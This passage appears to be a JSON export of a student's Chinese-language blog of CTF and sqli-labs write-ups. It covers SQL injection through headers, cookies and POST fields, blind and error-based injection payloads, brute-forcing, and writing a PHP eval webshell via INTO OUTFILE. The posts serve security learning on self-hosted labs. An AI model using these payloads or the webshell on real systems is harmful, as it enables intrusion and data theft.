simple_js按照道理来说，见面就要输密码的题，一般不太可能字典爆破的出来，再结合题目指向了js，那么我们就去查看网页的js 1234567891011121314151617181920212223242526272829&lt;html&gt;&lt;head&gt; &lt;title&gt;JS&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; function dechiffre(pass_enc)&#123; var pass = &quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;; var tab = pass_enc.split(&#x27;,&#x27;); var tab2 = pass.split(&#x27;,&#x27;);var i,j,k,l=0,m,n,o,p = &quot;&quot;;i = 0;j = tab.length; k = j + (l) + (n=0); n = tab2.length; for(i = (o=0); i &lt; (k = j = n); i++ )&#123;o = tab[i-l];p += String.fromCharCode((o = tab2[i])); if(i == 5)break;&#125; for(i = (o=0); i &lt; (k = j = n); i++ )&#123; o = tab[i-l]; if(i &gt; 5 &amp;&amp; i &lt; k-1) p += String.fromCharCode((o = tab2[i])); &#125; p += String.fromCharCode(tab2[17]); pass = p;return pass; &#125; String[&quot;fromCharCode&quot;](dechiffre(&quot;\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30&quot;)); h = window.prompt(&#x27;Enter password&#x27;); alert( dechiffre(h) );&lt;/script&gt;&lt;/head&gt;&lt;/html&gt; 我们发现了一串/x……代码，这串代码的格式为十六进制码，我们把它转换为对应的ascii码值，得出的文本十进制再进行一次转换，得到密码为786OsErtk12，这就是flag内容。 isc-6根据题目我们进入报表中心，发现了熟悉的get点，这里下意识先进行sql注入，但发现全部尝试都失败了，果断排除sql注入。再经历了御剑，抓包的洗礼也没发现有问题，审计源码也没有问题，种种可能性都被排除，那么我们只能把目光锁定在id值上了。 写一个最简单的脚本： 12for m in range(10001): print(m) 输出的数据放入burp suite中进行字典爆破，发现当id值为2333时，返回的长度不同，那么我们把2333get上去，flag就显示出来了。 总结因为这周没做靶场，就拿这周练习的题目写了点wp，实际上做的题不止这些，不过有些因为过于简单，有些因为比较复杂，就都没有写出来，等实验室的比赛平台开了就去写比赛的wp。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web前端 -write up -ctf","slug":"web前端-write-up-ctf","permalink":"http://example.com/tags/web%E5%89%8D%E7%AB%AF-write-up-ctf/"}]},{"title":"bugku-web练习","slug":"bugku练习","date":"2021-10-14T06:55:42.000Z","updated":"2021-10-17T08:20:59.229Z","comments":true,"path":"2021/10/14/bugku练习/","link":"","permalink":"http://example.com/2021/10/14/bugku%E7%BB%83%E4%B9%A0/","excerpt":"前言由于校赛要开始了，就做了些简单的题目练手，有bugku也有攻防世界的，这篇博客记录几题bugku的题。 滑稽看图实在费眼睛，直接f12查看源码找到flag走人就行了","text":"前言由于校赛要开始了，就做了些简单的题目练手，有bugku也有攻防世界的，这篇博客记录几题bugku的题。 滑稽看图实在费眼睛，直接f12查看源码找到flag走人就行了 计算器可以看到进入页面后是一道非常简单的计算题，答案一眼就能看出是70，但是我们打算输入时却发现，我们只能输入一个数字。使用f12查看源码，发现了这么一行：&lt;input type=&quot;text&quot; class=&quot;input&quot; maxlength=&quot;1&quot;&gt; 输入的最大长度为1，那么我们把1改成2，再输入进行验证就可以得到flag了。 GET &amp;&amp; POST非常直白的题目，这两题的页面都提供了php代码，分别以get和post上传一个waht=flag，flag就会回显出来了 矛盾我们分析这题的代码，可以知道我们需要以get的方式上传一个数值为1的非数字，这样看来确实是矛盾的。但是我们可以发现这里的判断符为==而并非===，因此不比较两个变量的类型，这样我们就可以输入字符串而并非数字来进行判断。这里我们get传入一个num=1a就可以了 头等舱web中与头相关我们首先想到的就是响应头和请求头了，因此这题直接查看网页的响应头，发现flag就在其中。 网站被黑这题一进去我们查看源码，抓包等都一无所获，因此我们要想到对网页进行路径扫描，这里我们用了御剑进行扫描，发现了shell.php，也就是被人上传木马了。 我们进入shell.php，发现需要密码，如果你能灵机一动猜出密码是hack的话，那恭喜你，得到了flag，否则的话还是老老实实进行字典爆破吧。 你必须让他停下进入页面后发现页面一直在刷新，但是在查看源码时可以发现有一次刷新是可以显示flag的，那么我们就耐心抓包，抓到flag就算成功。 本地管理员进入页面发现要输入账号密码，尝试输入后发现ip禁止访问，我们通过抓包添加一个xxf的请求头，将其设置为127.0.0.1，接着提示了无效凭证，那么估计就是密码的问题了，爆破密码直接无脑字典，爆出来密码为test123，最后登录获取flag。 总结以上八题都是比较简单的题目，主要接触了ctf题目的类型与解题思路，为周六的校赛做准备。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web前端 -write up -ctf","slug":"web前端-write-up-ctf","permalink":"http://example.com/tags/web%E5%89%8D%E7%AB%AF-write-up-ctf/"}]},{"title":"sqli-labs练习-less18-22","slug":"sqli-labs练习-less18-22","date":"2021-10-07T12:05:42.000Z","updated":"2021-10-08T15:44:02.597Z","comments":true,"path":"2021/10/07/sqli-labs练习-less18-22/","link":"","permalink":"http://example.com/2021/10/07/sqli-labs%E7%BB%83%E4%B9%A0-less18-22/","excerpt":"前言接下来的几关我们需要用到抓包工具来帮助我们进行解题，我们用到了burp suite工具（需要JAVA环境），并且通过下面几个靶场具体分析学习这个工具的使用。 less-18首先进入网页，我们发现显示了当前的ip地址，但这似乎对我们并没有什么用。依然尝试随便输入，发现提示登录失败，简单注入也没有报错回显。我们去查看下源码，发现账户密码都被check_input函数保护起来了，因此我们显然不能在这个页面中进行注入了。","text":"前言接下来的几关我们需要用到抓包工具来帮助我们进行解题，我们用到了burp suite工具（需要JAVA环境），并且通过下面几个靶场具体分析学习这个工具的使用。 less-18首先进入网页，我们发现显示了当前的ip地址，但这似乎对我们并没有什么用。依然尝试随便输入，发现提示登录失败，简单注入也没有报错回显。我们去查看下源码，发现账户密码都被check_input函数保护起来了，因此我们显然不能在这个页面中进行注入了。 既然页面不能注入，我们就进行抓包操作，先随意输入一组账号密码，得到抓包结果： 想要进行注入操作，我们就要先了解这些请求头的含义，这里举几个常用的请求头为例： HOST：指定被请求资源的Internet主机与端口号 User-Agent：允许客户端将操作系统、浏览器等信息报告给服务器 Referer：当前访问的URL的上一个URL X-Forwarded-For：请求端IP Cookie：一段文本，一般用来储存用户资料，相当重要 不过在这里我们似乎找不到注入点，那我们试着输入一段正确的账户密码。我们这里有两种操作： 我们在Proxy下直接更改账户密码并将其forward，我们可以回到浏览器查看结果 我们使用ctrl+r将其发送到Repeater中，在并request中修改账户密码，将其go到response中，并在response中的render下查看结果 这里我们选方法2：ps：这里密码为123456是因为在做24关的时候改密了，正常密码应该也为admin 我们可以发现这时返回了User-Agent，我们可以通过源码分析这段的注入原理：$insert=&quot;INSERT INTO &#39;security&#39;.&#39;uagents&#39; (&#39;uagent&#39;, &#39;ip_address&#39;, &#39;username&#39;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;; 这段代码便是我们注入的关键，这一次不是select语句，而是insert语句。这段代码会在登陆成功后回显uagent，并将uagent、IP、uname插入到security数据库的uagents表的uagent、ip_address、username三个字段中。并且结合其他代码我们可以知道，只有输入正确的账号密码才能进入到这个insert语句，因此我们可以判断注入点就在User-Agent中。 找到注入点后，我们就可以通过之前使用过的很多语句进行爆库了：还可以使用时间盲注或者其他类型的报错等等，这里不再赘述。 less-19十九关与十八关的差别不大，输入admin发现这次回显的是Referer内容，那我们就猜测注入点在referer中，通过查询源码发现也确实如此，那么我们就可以进行爆库了。 less-20通过标题提示我们知道这道题的关键在于cookie上。我们先去查看一波源码，发现这次的select语句对$cookie进行了查询，那么我们大可判断这次的注入点在cookie中。 我们来先分析burp suite是如何进行这关的抓包的：首先先验证账户密码是否正确，如果正确的话就进行set cookie 接下来forward之后我们就可以发现cookie已经被记录了下来：同时我们得知cookie只记录下了uname，这时我们修改cookie为1，用浏览器开发者工具读取cookie，发现admin依然保存在value值中。我们就可以判断当页面request时，若cookie中存在uname则直接读取，因此这题注入点就在cookie中。 找到了注入点，我们就可以开始平平无奇的爆库了，直接简单的查询语句加注释就行。 less21-22到这里我们就进入了靶场的第二页了，恭喜自己能更进一步了。我们进入21关，基于base64的cookie注入。这里关于base64的知识可以参考下面这个文章：base64介绍 我们首先用burp suite进行抓包，发现这次的cookie中出现了这段代码：Cookie: uname=YWRtaW4%3D这里的%3D就是“=”，这是一段很经典的base64，不过我们自然不用一个个自己解码，burp suite中的Decoder模块中的decode as就可以进行base64的编码与解码，那么我们就先进行解码，结果为admin。 不过这题同第20关的区别也就在这里了，其他的操作与20关并无相异，注意注入是否有括号，接着我们只要将原来输入的代码先进性base64编码再注入就行了。 而第22关是基于双引号的报错，只要使用双引号就行了 总结进入了靶场的Page2，难度比起Page1显著增加，接下来将会对特殊符号进行过滤，这又是新的挑战了。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web前端 -mysql","slug":"web前端-mysql","permalink":"http://example.com/tags/web%E5%89%8D%E7%AB%AF-mysql/"}]},{"title":"sqli-labs练习-less11-17","slug":"sqli-labs练习-less11-17","date":"2021-10-05T12:47:48.000Z","updated":"2021-10-06T06:12:25.134Z","comments":true,"path":"2021/10/05/sqli-labs练习-less11-17/","link":"","permalink":"http://example.com/2021/10/05/sqli-labs%E7%BB%83%E4%B9%A0-less11-17/","excerpt":"前言进入第10关后，我们就要开始接触POST注入了,11-16关在注入操作上并未与前面有较大差别，我们可以根据题目要求进行注入，从第17关开始网页中开始加入过滤，这要求我们学习更多的注入姿势来解决问题。 注意下面所列出的代码是基于php5版本的，若搭建的靶场为php7版本的，代码可能会有一定出入。 less11-16不说废话，直接上代码，以less-12的代码为例，下面也以less-12为例进行分析，其他的关卡都可以凭借题目进行注入，因此不再详解：","text":"前言进入第10关后，我们就要开始接触POST注入了,11-16关在注入操作上并未与前面有较大差别，我们可以根据题目要求进行注入，从第17关开始网页中开始加入过滤，这要求我们学习更多的注入姿势来解决问题。 注意下面所列出的代码是基于php5版本的，若搭建的靶场为php7版本的，代码可能会有一定出入。 less11-16不说废话，直接上代码，以less-12的代码为例，下面也以less-12为例进行分析，其他的关卡都可以凭借题目进行注入，因此不再详解： 12345678910111213if(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;]))&#123; $uname=$_POST[&#x27;uname&#x27;]; $passwd=$_POST[&#x27;passwd&#x27;];...... // connectivity $uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;; $passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; @$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); 我们可以发现从本质上来说，POST与GET的差别不是很大，作为HTTP请求的两种基本方法，他们最大的区别就在于GET是把参数写进了URL中，从指定的资源请求数据，而POST是向指定的资源提交要被处理的数据，是要我们上传数据的。两者具体的区别可以通过下面这篇文章学习：HTTP：GET对比POST 进入靶场我们可以发现多出了一个输入框，现在我们可以输入一个账号密码了，而不是在域名中输入一个id。通过上面的代码，比如当我们输入账号为1，密码为1后，就相当于POST了一个$uname=1&amp;$passwd=1，并且传入sql中进行查找，不过显然数据库中没有这一组账号密码，因此提示我们登录失败了。 注入的关键还是那行查询代码。我们发现查询代码中首先对我们POST的两个变量添加了双引号并且打上了括号，接着可以发现$uname在$passwd的前面，这就意味着我们从输入账户的那一栏添加注释可以屏蔽掉密码栏。知道这些后，我们就可以开始进行注入了注意：在使用注释“–+”时用空格代替“+”号，不然会报错，或者直接使用其他注释方法。 接下来就是使用order by爆字段，可以发现这次的字段数为2：这里也推荐使用火狐中的插件hackbar，可以去网上自行搜寻旧版本免费试用，新版本需要收费。 到此为止，剩下的事情就是熟悉的爆库了。熟练运用之前靶场中学会的查询、盲注等多种方法。特别提示，如果在做第十四关时发现标题和第十三关一样，那请你千万不要相信标题。 less-17第十七关它又不一样了。首先，当你在进行初始测试时，它会对你进行无情嘲讽，让你上头，但接着你发现无论怎样在账户中注入，都只有对你的嘲讽出现。你不得不冷静下来，翻开源码： 123456789101112131415161718192021222324function check_input($value) &#123; if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,15); &#125; // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; if (!ctype_digit($value)) &#123; $value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;; &#125; else &#123; $value = intval($value); &#125; return $value; &#125; 我们发现了这段check_input函数，并且还发现了$uname这个变量进行了一次check_input函数。接下来我们详细分析一下这个函数： 第一个判断，如果输入的值不为空，截取最多15个字符，这意味着我们想进行注入的话只能保证字符在15个以内，现在对于我们来说这几乎是不可能的。 接着判断当前设置中get_magic_quotes_gpc是否开启了，如果开启了的话将会为通过get、post与cookie传来的数据中的引号前加入反斜杠，相当于自动为数据进行了一次addslashes()，因此如果开启，则通过stripslashes()函数删去其中的反斜杠。 最后判断输入的值是否为十进制纯数字，如果不是则将值中的特殊字符转义，否则取整。以下这些字符会被mysql_real_escape_string()转义：\\x00（空值），\\n（换行），\\r（回车） ，反斜杠，单引号，双引号，\\x1a（十六进制） 这段函数对用户名实行了保护，因此我们不能从用户名中入手了，但是翻看源码，它居然没有保护密码。因此我们只要获得一个合法的用户名，就可以从密码栏入手了：$uname=admin&amp;$passwd=&#39; order by 3#如此一来，我们就可以开始爆库了。 总结POST注入方法与GET注入大同小异，但是对输入的数据进行一定的过滤却给我们造成了一定的麻烦，而且这样的过滤在以后会愈发严苛。因此接下来我们要开始学习抓包工具的使用，对网页进行新的注入。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web前端 -mysql","slug":"web前端-mysql","permalink":"http://example.com/tags/web%E5%89%8D%E7%AB%AF-mysql/"}]},{"title":"sqli-labs练习-less8-10","slug":"sqli-labs练习-less8-10","date":"2021-10-02T04:56:56.000Z","updated":"2021-10-02T07:33:09.659Z","comments":true,"path":"2021/10/02/sqli-labs练习-less8-10/","link":"","permalink":"http://example.com/2021/10/02/sqli-labs%E7%BB%83%E4%B9%A0-less8-10/","excerpt":"前言接下来的三关就是盲注题了，盲注是SQL注入中最重要的技能，当页面中的数据无法回显到前端时，就需要借助盲注手段来判断。同时，盲注往往也带有着工具或脚本的使用，我们也可以借此机会进行学习。 关于盲注盲注的使用要基于用户自己可以对输入进行控制，且要能接入进执行代码中。盲注分为两种：布尔盲注和时间盲注。","text":"前言接下来的三关就是盲注题了，盲注是SQL注入中最重要的技能，当页面中的数据无法回显到前端时，就需要借助盲注手段来判断。同时，盲注往往也带有着工具或脚本的使用，我们也可以借此机会进行学习。 关于盲注盲注的使用要基于用户自己可以对输入进行控制，且要能接入进执行代码中。盲注分为两种：布尔盲注和时间盲注。 布尔盲注：通过返回true与false的不同，导致页面的回显不同进行判断，之前使用and 1=1与and 1=2判断注入点也是用此原理 时间盲注：通过返回true与false的不同，导致页面的加载时间不同进行判断，一般使用if语句 less-8标题就是基于单引号的布尔盲注，那我们先将id和单引号一起输入进去，然后发现这是一点报错都没有啊。我们可以查看源码，发现报错这一行（下列源码的第三行）被注释了： 123456echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;;//echo &#x27;You are in...........&#x27;;//print_r(mysql_error());//echo &quot;You have an error in your SQL syntax&quot;;echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;; 那么这种情况下我们就需要使用盲注了。先用and 1=1和and 1=2判断，发现前者会回显一个“You are in….”，而后者依然是什么都没有，那么我们就知道了，当返回true时，页面会回显一句话，反之则什么都不回显。 既然掌握了原理，那么我们就可以开始准备注入了。下面我们来介绍我们需要用到的函数： length()：返回字符串的长度 substr(str,start,len):截取“str”字符串从第“start”位开始的“len”长度的字符 ascii()：返回字符的ascii码值，关于ascii码值可以参考下图： 正式开始注入，我们使用and或者or来对代码进行连接，一定要注意，and的true返回条件是左右两边都为真，or的true返回条件只需要有一边为真就行了，因此在这里前面id如果存在于数据库之中要用and，不存在则用or。由于刷POST题时犯了个蠢，在这里先提一下。 由于我们已经知道数据库的名称为security了，所以我们就不从猜数据库开始了，可以用length(database())先确定数据库名称的长度，再一位一位进行猜测。这里我们直接开始猜表。首先是表的个数：n=(select count(table_name) from information_schema.tables where table_schema=&#39;数据库名&#39;) n可以替换为任何数，后面的查询语句也可以替换来查询表的列数等等。当返回true时，也就是我们看到“You are in….”时，代表着我们猜对了，我们就可以进行下一步猜表名了：ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),m,1))=n 这里我们用limit限制了查询的表为数据库中的第一个表，这个函数验证的是第一个表的第m个字段的ascii码是否为n，这个等号也可以替换为大于号或者小于号来帮助我们缩小范围。通过这种方法我们可以逐步推出第一个表的名字为emali。但是一个个试的效率是十分低的，我们可以用二分法来提高效率，或者学习如何使用脚本或者工具来帮助我们提高效率，这里就不展开了。 得到表的名称后，我们可以更改以上代码的查询语句一步步查询出我们想要的数据了。 less-9这关根据标题要使用时间盲注，但我先用了布尔盲注进行测试，结果发现无论返回true还是false，页面都会回显“You are in….”，查看源码就可以发现确实如此，因此这个靶场我们就要使用时间盲注了。 使用时间盲注时我们会用到if语句和sleep()函数进行配合： if(expr1,expr2,expr3)：当语句1返回的结果为true时，执行语句2，反之则执行语句3 sleep(x)：延迟执行脚本x秒 时间盲注有个很显著的优点，不需要通过页面回显来判断，在页面没有回显内容的时候，时间盲注就可以很好的帮助我们进行判断。例如我们同样来判断数据库中表的个数：if(n=(select count(table_name) from information_schema.tables where table_schema=&#39;数据库名&#39;),sleep(3),1) 显而易见，当数据库中表的个数为n时，脚本将暂停3秒再执行，否则什么都不会发生，这样我们就可以通过观察网页的加载时间来判断返回值是true还是false。 这样一来，我们只要将if()中的语句1进行更改，就可以像less-8一样逐步获得数据库中的信息了。 less-10把单引号换成双引号，然后把less-9的过程走一遍，然后你就成功又做出了一关，这真是令人感到高兴呢（bushi）。 总结刷到这里，前十关的GET型靶场就刷完了，接下来就是POST型靶场了，但其实两者的区别不大，只要我们掌握好前十关用到的方法，熟练运用，一直到less-16相信都能很快解开。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web前端 -mysql","slug":"web前端-mysql","permalink":"http://example.com/tags/web%E5%89%8D%E7%AB%AF-mysql/"}]},{"title":"sqli-labs练习-less7","slug":"sqli-labs练习-less7","date":"2021-10-01T02:53:40.000Z","updated":"2021-10-02T07:32:56.828Z","comments":true,"path":"2021/10/01/sqli-labs练习-less7/","link":"","permalink":"http://example.com/2021/10/01/sqli-labs%E7%BB%83%E4%B9%A0-less7/","excerpt":"前言由于less7相比于其他的关卡比较特殊，因此单独对这个靶场进行详细的分析。less7靶场我们要学习上传一句话木马获得网页的控制权，并且使用工具（例如菜刀）来进行连接。 less-7输入id后，我们发现这次的返回文字多了一段“Use outfile……”，那么结合提示我们就可以判断出这题需要我们通过写入文件并注入一句话木马来对网页实现控制。","text":"前言由于less7相比于其他的关卡比较特殊，因此单独对这个靶场进行详细的分析。less7靶场我们要学习上传一句话木马获得网页的控制权，并且使用工具（例如菜刀）来进行连接。 less-7输入id后，我们发现这次的返回文字多了一段“Use outfile……”，那么结合提示我们就可以判断出这题需要我们通过写入文件并注入一句话木马来对网页实现控制。 那么首先，我们也要先找到注入点。试试单引号，双引号，单引号加括号等多种形式，我们找到了答案为单引号加上两个括号。接下来，我们开始进行注入。 首先要注意的是，我们在进行outfile文件注入的时候必须要有root权限，而且要知道网站绝对路径的地址。不过由于这个靶场是我们自己搭的，因此很容易可以满足这些条件，当然，我们也可在之前的靶场中使用@@datadir指令来获得数据库的路径： 好有了绝对路径，直接动手，我们使用这段代码：select ... into outfile &quot;绝对路径&quot;这段代码可以将select的内容注入进绝对路径下的一个文件，我们这里注入到一个7.php的文件下，如果没有这个文件会自动创建一个同名文件，但是这条代码不会覆盖原文件，因此写入时最好一次成功，如果要再次写入则需要更换文件名。 要特别注意的是，在复制绝对路径后，我们需要在“\\”后再加上一个“\\”或者将“\\”改成“/”，例如： 12D:\\\\phpstudy_pro\\\\WWW\\\\sqli-labs-master\\\\Less-7\\\\7.phpD:/phpstudy_pro/WWW/sqli-labs-master/Less-7/7.php 有代码基础的一定知道，“\\”代表着转义字符，而\\\\才是意味着字符“\\”。而“\\”的路径是windows系统所独有的表达方式，但“/”表达的路径是可以被windows、linux和mac等操作系统共同识别的，因此更推荐第二种表达路径的方式。 接下来我们要注入一句话木马了，php格式的一句话木马为：&lt;?php @eval($_POST[&#39;chopper&#39;]);?&gt;其中的chopper是值，前面的POST（或者REQUEST等）用来获取这个值，这个值之后要用到，可自定义。这样我们就可以使用工具（菜刀，webshell等）进行访问了。 注入之后我们发现页面虽然报错，但是浏览本地文件，发现了这个7.php已经成功注入进文件夹中了，并且代码也已经被成功写入： 注入成功，我们就可以掏出我们的工具了，这里使用菜刀。如上，连接成功！ 总结文件写入是解题时一项重要的技能，在解题时学习工具的使用，将会更好的帮助我们获取数据，解开谜题。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web前端 -mysql","slug":"web前端-mysql","permalink":"http://example.com/tags/web%E5%89%8D%E7%AB%AF-mysql/"}]},{"title":"sqli-labs练习-less5-6","slug":"sqli-labs练习-less5-6","date":"2021-09-28T12:18:07.000Z","updated":"2021-09-28T13:43:40.715Z","comments":true,"path":"2021/09/28/sqli-labs练习-less5-6/","link":"","permalink":"http://example.com/2021/09/28/sqli-labs%E7%BB%83%E4%B9%A0-less5-6/","excerpt":"前言进入第五个靶场以后，我们需要运用到的知识就更为广泛了，仅凭借less1-4的方式是无法解决问题的。因此我们要后面的靶场中要多去搜索，尽力去理解每一关中的注入类型，学会更多的注入姿势。 less-5方法1进入第五个靶场，在我们输入id之后，我们会发现一切都变了，屏幕上只剩下一句“You are in……..”和在屏幕前一脸懵的我们。遇到这种情况先不要惊慌，还记得提示内容依然指向了单引号，既然如此，我们依然在域名最后先加上一个单引号。","text":"前言进入第五个靶场以后，我们需要运用到的知识就更为广泛了，仅凭借less1-4的方式是无法解决问题的。因此我们要后面的靶场中要多去搜索，尽力去理解每一关中的注入类型，学会更多的注入姿势。 less-5方法1进入第五个靶场，在我们输入id之后，我们会发现一切都变了，屏幕上只剩下一句“You are in……..”和在屏幕前一脸懵的我们。遇到这种情况先不要惊慌，还记得提示内容依然指向了单引号，既然如此，我们依然在域名最后先加上一个单引号。 回车来了，报错就有了。这是一段与less-1完全一致的报错，加上注释后回显恢复正常，再用and 1=1和and 1=2检验后可以确定这里存在注入点。既然存在注入点，那就有解开它的方法。但是显然，不管我们怎样更改id的值，得到的永远只有那句“You are in……..”。 显然前四关使用union联合查询的方法在这关不起作用。那么我们就得换个思路了，提示指向了双查询注入，那么我们就将目光放到双查询注入上。双查询注入原理浅析我们可以先通过上面的网址简单了解双查询注入的运行原理，了解之后我们将这段floor()报错的语句摘取出来：and (select 1 from (select count(*),concat((查询语句),floor (rand(0)*2))x from information_schema.tables group by x)a) 这段代码就是我们解开问题的关键所在，将这段代码中的查询语句改为database()并补入域名之中，可以发现报错已经回显了当前所在的数据库名： 这时我们也许会有疑问了，为什么数据库的名字变成了“security1”呢？其实这不是因为数据库的名字变了，而是这个“1”为floor()报错语句中输出的一部分，无论输出什么都会出现这个“1”，因此数据库的实际名称仍然为“security”。 既然问题解决了，那么就进入了愉快的爆库流程了，但是当我们在获取表中的数据时，出现了这么一行： Subquery returns more than 1 row 我们页面的信息超过了一行，在我们使用了group_concat函数的情况下显示这个报错说明了这里的字符长度超过了64位。这种情况下，我们应该使用limit数来进行一个个输出：select concat(列名) from 数据库名.数据表名 limit 0,1 方法2用完floor()报错后，我就在想有没有其他的报错方法也能达到相同的效果呢，结果还真有：updatexml(1,concat(0x7e, 查询语句,0x7e),1)或者extractvalue(1,concat(0x7e,查询语句,0x7e))这两句代码的具体语法可以参考下面这个链接的教程：方法2中的报错注入 这里简单介绍下这两句代码的报错原理，这两句代码的第二个参数需要设置Xpath格式的字符串，而“0x7e”，即“~”开头不符合其语法，concat()函数为字符串连接函数不符合规则，导致代码中括号内的结果以错误的形式报出，达到目的。 而这两句代码的字符串限制为32位，因此在进行爆表流程时，我们也应该使用limit函数将数据一行一行显示出来，达到同样效果。 less-6观察less-6的标题，发现好像就是把单引号变成了双引号，那是不是我们也只要将代码中id后面的单引号变成双引号呢？ 要是真的这么想，那你可真是太聪明了，这关真的就只要把单引号改成双引号就可以了，然后就根据第五关的方法就可以顺利解开了。 总结通过练习靶场中的less5-6，我们了解并学习了sql注入中的双重查询注入与报错回显，这两关靶场的新内容明显多于前四个靶场，越往后深入，我们也会学习到更多的新内容。因此我们必须记录下自己的学习历程，不断进步，不断提高。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web前端 -mysql","slug":"web前端-mysql","permalink":"http://example.com/tags/web%E5%89%8D%E7%AB%AF-mysql/"}]},{"title":"sqli-labs练习-less2-4","slug":"sqli-labs练习-less2-4","date":"2021-09-27T12:44:02.000Z","updated":"2021-11-13T11:09:52.112Z","comments":true,"path":"2021/09/27/sqli-labs练习-less2-4/","link":"","permalink":"http://example.com/2021/09/27/sqli-labs%E7%BB%83%E4%B9%A0-less2-4/","excerpt":"前言在进行了less-1的靶场练习后，我们就有了完成前4个靶场的能力，只要仔细看好报错语句以及提示，相信less2-4完全不会难住我们。","text":"前言在进行了less-1的靶场练习后，我们就有了完成前4个靶场的能力，只要仔细看好报错语句以及提示，相信less2-4完全不会难住我们。 less-2又看到了那段熟悉的提示，依旧十分愉快地输入上id，也十分愉快地看到了熟悉的账户密码。但是我们再次注入单引号时，发现了这次的报错提示与less-1不一样了。less-1输入单引号后的报错： You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1 less-2输入单引号后的报错： You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1 我们发现引号之中的’1’不见了，再结合第二关的提示（GET-Error based-Intiger based），我们就可以知道在这一关中的sql查询代码中原本id两边的单引号不见了，我们去翻阅下源代码，果不其然： 123$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); 既然源代码中id没有了单引号，那么我们就可以直接对其进行注入，如果不放心，我们可以用and 1=1和and 1=2来进行验证。验证成功后，我们就可以进行愉快的爆库流程了: less-3同样的配方，同样的味道，那我们也先使用同样的方式，加上熟悉的单引号后，我们发现这次的报错多了一个新同学： You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’) LIMIT 0,1’ at line 1 是括号，他加了括号。已经做了两个靶场的我们，相信已经对那段sql查询代码十分熟悉了，注入的关键点就在那段&amp;id=’id’中。我们将1’带入，发现变量变成了&amp;id=’1’’,这时根据报错我们可以发现引号的右边多出了一个），我们就可以推断本题的查询代码应该为：$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;; 查看了源码后，果然如此，那么分析出了代码，那么这题的注入就十分简单了，我们只需要在单引号后补充一个“）”，并将后面的内容注释掉，我们就可以进行熟练的爆库了。 less-4这次我们发现提示他变了，他从我们的老朋友single quotes变成了double quotes，其实也就是把单引号注入变成了双引号注入，该怎么样还是换汤不换药。既然提示都说了如此，我们这次将单引号换成双引号后进行注入，发现报错如下： You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1””) LIMIT 0,1’ at line 1 换汤不换药，本关中的报错同上一关只是有几个单引号变成了双引号，那就说明只要我们加上一个右括号并注释后面的内容后就可以进行注入了。在爆库之前，我们把源码拿出来分析一下： 1234$id = &#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;;$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); 第一行代码的意思就是&amp;id=”id”,我们可以把这关的查询语句看成$sql=&quot;SELECT * FROM users WHERE id=(&quot;id&quot;) LIMIT 0,1;,这样我们就可以很好的理解本关的注入原理了。分析完毕，爆库。 总结经历了四个靶场的洗礼，我们已经基本掌握了SQL注入的最基本原理与方法。在之后靶场的练习中，我们将学习更多更复杂的注入方式，我们要做好记录，认真研究，及时复习，继续学习相关知识，拓宽自己。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web前端 -mysql","slug":"web前端-mysql","permalink":"http://example.com/tags/web%E5%89%8D%E7%AB%AF-mysql/"}]},{"title":"sqli-labs练习 less1","slug":"sqli-labs练习-less1","date":"2021-09-26T08:25:32.000Z","updated":"2021-09-27T14:00:36.082Z","comments":true,"path":"2021/09/26/sqli-labs练习-less1/","link":"","permalink":"http://example.com/2021/09/26/sqli-labs%E7%BB%83%E4%B9%A0-less1/","excerpt":"前言在学习完php的基本语言和mysql增删查改语句后，我们已经初步具备了靶场练习的能力，在群文件的《web安全方向入门学习计划表》中就提供了靶场的下载途径。让我们先从sqli-labs开始练习SQL注入。 